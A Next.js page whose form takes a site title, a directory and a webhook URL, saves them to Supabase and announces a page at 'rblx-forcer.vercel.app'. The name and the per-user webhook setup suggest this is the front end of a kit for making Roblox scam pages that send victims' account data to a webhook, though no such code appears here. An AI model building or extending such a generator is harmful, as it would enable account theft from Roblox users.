import { useState } from "react";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function Home() {
  const [title, setTitle] = useState("");
  const [directory, setDirectory] = useState("");
  const [webhookUrl, setWebhookUrl] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!title || !directory || !webhookUrl) {
      setMessage("⚠️ Please fill in all fields!");
      return;
    }

    const { error } = await supabase.from("websites").insert([
      { title, directory, webhook_url: webhookUrl },
    ]);

    if (error) {
      setMessage(`❌ Error: ${error.message}`);
    } else {
      setMessage(`✅ Website created! Visit /${directory}`);
      setTitle("");
      setDirectory("");
      setWebhookUrl("");
    }
  };

  return (
    <main className="flex flex-col items-center justify-center min-h-screen p-6 bg-gray-50">
      <h1 className="text-4xl font-bold mb-6 text-center">Generate Website</h1>
      <form
        onSubmit={handleSubmit}
        className="bg-white shadow-lg rounded-2xl p-6 w-full max-w-md flex flex-col gap-4"
      >
        <input
          type="text"
          placeholder="Website Title"
          value={title}
          onChange={(e) => setTitle(e.target.value)}
          className="border border-gray-300 p-2 rounded focus:ring-2 focus:ring-blue-500"
          required
        />
        <input
          type="text"
          placeholder="Directory Name (e.g., my-site)"
          value={directory}
          onChange={(e) => setDirectory(e.target.value.toLowerCase())}
          className="border border-gray-300 p-2 rounded focus:ring-2 focus:ring-blue-500"
          required
        />
        <input
          type="url"
          placeholder="Webhook URL"
          value={webhookUrl}
          onChange={(e) => setWebhookUrl(e.target.value)}
          className="border border-gray-300 p-2 rounded focus:ring-2 focus:ring-blue-500"
          required
        />
        <button
          type="submit"
          className="bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition"
        >
          Generate Website
        </button>
      </form>

      {message && <p className="mt-4 text-center">{message}</p>}

      <footer className="mt-10 text-gray-600 text-sm text-center">
        Will create:{" "}
        <strong>
          https://rblx-forcer.vercel.app/{directory || "your-directory"}
        </strong>
        <br />
        Webhook for your user: <strong>{webhookUrl || "your webhook URL"}</strong>
      </footer>
    </main>
  );
}
